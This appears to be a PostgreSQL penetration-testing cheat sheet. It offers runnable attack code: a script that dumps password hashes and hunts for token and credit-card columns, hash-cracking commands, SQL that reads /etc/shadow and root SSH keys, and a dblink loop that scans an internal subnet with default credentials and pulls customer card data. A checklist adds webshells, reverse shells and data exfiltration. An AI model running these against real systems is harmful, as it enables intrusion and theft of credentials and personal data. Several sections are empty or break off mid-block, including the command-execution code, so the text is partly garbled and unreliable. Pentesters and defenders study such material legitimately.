## Overview

PostgreSQL (Postgres) is a powerful, open-source object-relational database system known for extensibility and SQL compliance. It listens on **TCP port 5432** by default and supports advanced features such as custom functions, extensions, large objects, and server-side programming — all of which expand the attack surface significantly during penetration tests.

::card-group
  ::card
  ---
  title: Default Port
  icon: i-lucide-network
  ---
  `5432` (default), `5433` (secondary instances), `6432` (PgBouncer)
  ::

  ::card
  ---
  title: Protocol
  icon: i-lucide-cable
  ---
  PostgreSQL Frontend/Backend wire protocol over TCP. Supports plaintext, MD5, SCRAM-SHA-256, certificate, GSSAPI, SSPI authentication.
  ::

  ::card
  ---
  title: Authentication
  icon: i-lucide-lock
  ---
  Controlled by `pg_hba.conf`. Methods include `trust`, `md5`, `scram-sha-256`, `password`, `peer`, `ident`, `cert`, `ldap`, `gss`. The `trust` method allows **passwordless access**.
  ::

  ---
  title: Tags
  icon: i-lucide-tags
  ---
  `network pentesting` · `postgresql` · `rdbms` · `sql injection` · `rce` · `file read` · `file write` · `privilege escalation` · `udf`

  ```python [pgsql_enum.py]
  import psycopg2

  target = "<target>"
  port = 5432
  user = "postgres"
  password = "postgres"  # or empty string for trust auth
  database = "postgres"

  try:
      conn = psycopg2.connect(
          host=target, port=port,
          user=user, password=password,
          database=database,
          connect_timeout=5
      )
      cur = conn.cursor()

      # Version
      cur.execute("SELECT version()")
      print(f"[*] Version: {cur.fetchone()[0]}")

      # Current user and superuser check
      cur.execute("SELECT current_user, current_setting('is_superuser')")
      row = cur.fetchone()
      print(f"[*] User: {row[0]}, Superuser: {row[1]}")

      # List databases
      cur.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
      print("\n[*] Databases:")
      for row in cur.fetchall():
          print(f"    {row[0]}")

      # List users with password hashes
      cur.execute("SELECT usename, passwd FROM pg_shadow")
      print("\n[*] Users and hashes:")
      for row in cur.fetchall():
          print(f"    {row[0]}: {row[1]}")

      # Search for sensitive columns
      cur.execute("""
          SELECT table_schema, table_name, column_name
          FROM information_schema.columns
          WHERE column_name ILIKE '%pass%'
          OR column_name ILIKE '%secret%'
          OR column_name ILIKE '%token%'
          OR column_name ILIKE '%credit%'
          OR column_name ILIKE '%ssn%'
      """)
      print("\n[*] Sensitive columns found:")
      for row in cur.fetchall():
          print(f"    {row[0]}.{row[1]}.{row[2]}")

      # List extensions
      cur.execute("SELECT extname, extversion FROM pg_extension")
      print("\n[*] Extensions:")
      for row in cur.fetchall():
          print(f"    {row[0]} v{row[1]}")

      # Active connections
      cur.execute("SELECT datname, usename, client_addr, state FROM pg_stat_activity")
      print("\n[*] Active connections:")
      for row in cur.fetchall():
          print(f"    DB:{row[0]} User:{row[1]} From:{row[2]} State:{row[3]}")

      cur.close()
      conn.close()

  except psycopg2.OperationalError as e:
      print(f"[-] Connection failed: {e}")
  ```

## Brute Force & Credential Attacks

### Default Credentials

::callout{icon="i-lucide-key"}
PostgreSQL uses `pg_hba.conf` to control authentication. When set to `trust`, **any user connects without a password**. Always test passwordless connections first.
::

::collapsible

### Password Hash Extraction & Cracking

```sql [hash-extraction.sql]
-- Extract MD5 password hashes (requires superuser)
SELECT usename, passwd FROM pg_shadow;

-- PostgreSQL MD5 hash format: md5 + md5(password + username)
-- Example: md5d7d880f96044b72d0bba108ace96d1e4

-- Extract SCRAM-SHA-256 hashes (PostgreSQL 10+)
SELECT rolname, rolpassword FROM pg_authid;
-- Format: SCRAM-SHA-256$<iterations>:<salt>$<StoredKey>:<ServerKey>
```

```bash [Terminal]
# Crack PostgreSQL MD5 hashes with Hashcat
# Mode 12 = PostgreSQL MD5
hashcat -m 12 hashes.txt /usr/share/wordlists/rockyou.txt

# Hash format for hashcat: md5hash:username
# Example: d7d880f96044b72d0bba108ace96d1e4:postgres

# Crack with John
john --format=dynamic_1034 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Alternative John format
john --format=raw-md5 hashes.txt

# SCRAM-SHA-256 cracking (limited support)
# hashcat mode 28600
hashcat -m 28600 scram-hashes.txt /usr/share/wordlists/rockyou.txt
```

## Exploitation

### File Read (Arbitrary File Access)

::warning
PostgreSQL superusers can read arbitrary files on the server filesystem. Multiple methods exist depending on version and configuration.
::

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="COPY FROM"}
  ```sql [psql]
  -- Read /etc/passwd using COPY
  CREATE TABLE pwn(data TEXT);
  COPY pwn FROM '/etc/passwd';
  SELECT * FROM pwn;
  DROP TABLE pwn;

  -- Read shadow file
  CREATE TABLE shadow(data TEXT);
  COPY shadow FROM '/etc/shadow';
  SELECT * FROM shadow;
  DROP TABLE shadow;

  -- Read SSH private keys
  CREATE TABLE sshkeys(data TEXT);
  COPY sshkeys FROM '/root/.ssh/id_rsa';
  SELECT * FROM sshkeys;
  DROP TABLE sshkeys;

  -- Read pg_hba.conf
  CREATE TABLE hba(data TEXT);
  COPY hba FROM '/etc/postgresql/14/main/pg_hba.conf';
  SELECT * FROM hba;
  DROP TABLE hba;

  -- Read PostgreSQL config
  CREATE TABLE pgconf(data TEXT);
  COPY pgconf FROM '/etc/postgresql/14/main/postgresql.conf';
  SELECT * FROM pgconf;
  DROP TABLE pgconf;

  -- One-liner without creating table
  COPY (SELECT '') TO PROGRAM 'cat /etc/passwd';
  ```
  :::

  :::tabs-item{icon="i-lucide-file-search" label="pg_read_file"}
  ```sql [psql]
  -- pg_read_file (superuser only, PostgreSQL 8.1+)
  SELECT pg_read_file('/etc/passwd');
  SELECT pg_read_file('/etc/shadow');
  SELECT pg_read_file('/etc/hostname');
  SELECT pg_read_file('/proc/self/environ');
  SELECT pg_read_file('/proc/self/cmdline');
  SELECT pg_read_file('/var/lib/postgresql/14/main/pg_hba.conf');

  -- Read with offset and length
  SELECT pg_read_file('/etc/passwd', 0, 1000);

  -- Read binary files
  SELECT encode(pg_read_binary_file('/etc/passwd'), 'base64');
  SELECT encode(pg_read_binary_file('/root/.ssh/id_rsa'), 'base64');
  ```

### Command Execution (RCE)

::note
PostgreSQL provides multiple mechanisms for executing operating system commands. Each requires different privilege levels.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="COPY TO PROGRAM"}
  ```sql [psql]
  -- COPY TO/FROM PROGRAM (PostgreSQL 9.3+, superuser only)
  -- Most direct and reliable RCE method

  -- Basic command execution
  ```

### Lateral Movement

```sql [psql]
-- Search for stored connection strings
SELECT * FROM pg_user_mappings;
SELECT * FROM pg_foreign_server;

-- dblink to discover internal PostgreSQL instances
CREATE EXTENSION IF NOT EXISTS dblink;

-- Scan internal network for PostgreSQL
DO $$
DECLARE
  target TEXT;
BEGIN
  FOR i IN 1..254 LOOP
    target := '10.10.10.' || i;
    BEGIN
      PERFORM dblink_connect('probe',
        'host=' || target || ' port=5432 user=postgres password=postgres connect_timeout=1 dbname=postgres');
      RAISE NOTICE '[+] % - Connected!', target;

      -- Extract data from discovered instance
      PERFORM dblink_disconnect('probe');
    EXCEPTION WHEN OTHERS THEN
      NULL;
    END;
  END LOOP;
END $$;

-- Access discovered databases
SELECT * FROM dblink(
  'host=10.10.10.5 port=5432 user=postgres password=postgres dbname=production',
  'SELECT usename, passwd FROM pg_shadow'
) AS t(usename TEXT, passwd TEXT);

-- Pivot through multiple databases
SELECT * FROM dblink(
  'host=internal-db port=5432 user=app password=app123 dbname=customers',
  'SELECT name, email, credit_card FROM customer_data'
) AS t(name TEXT, email TEXT, cc TEXT);

-- Check for password reuse
-- Try extracted credentials against SSH, other databases, web apps

-- Extract .pgpass files for stored credentials
SELECT pg_read_file('/var/lib/postgresql/.pgpass');
SELECT pg_read_file('/home/postgres/.pgpass');
```

## Known CVEs & Exploits

::field-group
  ::field{name="CVE-2019-9193" type="RCE — By Design"}
  `COPY TO/FROM PROGRAM` allows superusers to execute arbitrary OS commands. While documented behavior, it is frequently exploited when superuser credentials are obtained. Affects all versions with this feature (9.3+).
  ::

  ::field{name="CVE-2023-5868" type="Memory Disclosure — CVSS 4.3"}
  Certain aggregate function calls with `ORDER BY` can reveal bytes of server memory. Affects PostgreSQL 16 before 16.1, 15 before 15.5, 14 before 14.10, 13 before 13.13.
  ::

  ::field{name="CVE-2023-5869" type="RCE — CVSS 8.8"}
  Buffer overflow in integer overflow during SQL array value modification. Authenticated attacker can execute arbitrary code. Affects PostgreSQL before 16.1, 15.5, 14.10, 13.13, 12.17, 11.22.
  ::

  ::field{name="CVE-2023-5870" type="DoS — CVSS 4.4"}
  `pg_cancel_backend` role can signal certain superuser processes. Allows denial of service by canceling critical autovacuum operations.
  ::

  ::field{name="CVE-2023-39417" type="SQL Injection — CVSS 8.8"}
  SQL injection in extension script `@extowner@`, `@extschema@`, and `@extschema:...@` substitutions. Allows privilege escalation when creating trusted extensions.
  ::

  ::field{name="CVE-2022-2625" type="Privilege Escalation — CVSS 8.0"}
  Extension scripts replace objects not belonging to the extension during `CREATE EXTENSION` or `ALTER EXTENSION UPDATE`. Allows a database user to run arbitrary code as the bootstrap superuser.
  ::

  ::field{name="CVE-2022-1552" type="Privilege Escalation — CVSS 8.8"}
  Autovacuum, `REINDEX`, `CREATE INDEX`, `REFRESH MATERIALIZED VIEW`, `CLUSTER`, and `pg_amcheck` execute SQL under the table owner's identity without adequate protection against search_path attacks. An attacker can substitute objects to execute arbitrary SQL as superuser.
  ::

  ::field{name="CVE-2021-23214" type="MITM — CVSS 8.1"}
  Server processes unencrypted bytes from a man-in-the-middle attacker as valid SSL/TLS data after first valid transmission. Allows injection of false responses.
  ::

  ::field{name="CVE-2020-25695" type="Privilege Escalation — CVSS 8.8"}
  An attacker with CREATE permission on a non-temp schema can execute arbitrary SQL as superuser during `ALTER TABLE` rules, `REFRESH MATERIALIZED VIEW`, or `CLUSTER`.
  ::
::

## Pentest Checklist

::steps{level="4"}

#### Test for Trust Authentication

Attempt connection without any password using `psql -h <target> -U postgres`. Trust auth means immediate full access.

#### Enumerate Server Version and Configuration

Run `SELECT version()`, `SHOW all`, and query `pg_settings` for security-relevant configuration like `listen_addresses`, `ssl`, and `log_connections`.

#### Test Default and Common Credentials

Try `postgres:postgres`, `postgres:(empty)`, and other common combinations. Use Hydra or Metasploit for automated brute force.

#### Check Superuser Status

Verify if the compromised user is a superuser via `SELECT current_setting('is_superuser')`. Superuser access unlocks file read/write and OS command execution.

#### Extract Password Hashes

Query `pg_shadow` or `pg_authid` for password hashes. Crack MD5 or SCRAM-SHA-256 hashes offline with Hashcat.

#### Enumerate All Databases, Tables, and Sensitive Data

List databases, schemas, tables, and search for columns containing passwords, tokens, secrets, credit card numbers, or PII.

#### Test File Read Capabilities

Use `pg_read_file()`, `COPY FROM`, or `lo_import()` to read `/etc/passwd`, `/etc/shadow`, SSH keys, and application config files.

#### Test File Write Capabilities

Write webshells to web roots, SSH keys to `.ssh/authorized_keys`, or crontab entries using `COPY TO` or `lo_export()`.

#### Attempt Command Execution

Use `COPY TO PROGRAM`, PL/Python, PL/Perl, or UDF loading to execute OS commands and obtain reverse shells.

#### Test SQL Injection Vectors

If targeting a web application, test for PostgreSQL-specific injection using stacked queries, COPY PROGRAM via injection, and error-based extraction.

#### Enumerate Internal Network via dblink

Use `dblink` or `postgres_fdw` extensions to connect to internal PostgreSQL instances, scan internal ports, and pivot to other databases.

#### Check for Privilege Escalation Paths

Look for SECURITY DEFINER functions owned by superusers, writable `pg_hba.conf`, search_path attacks, and extension vulnerabilities.

#### Exfiltrate Data and Credentials

Dump high-value databases with `pg_dump`, extract `.pgpass` files, and search application configs for connection strings to other services.

#### Document and Report

Record all findings including unauthenticated access, RCE, data exposure, privilege escalation, and provide remediation recommendations.

::
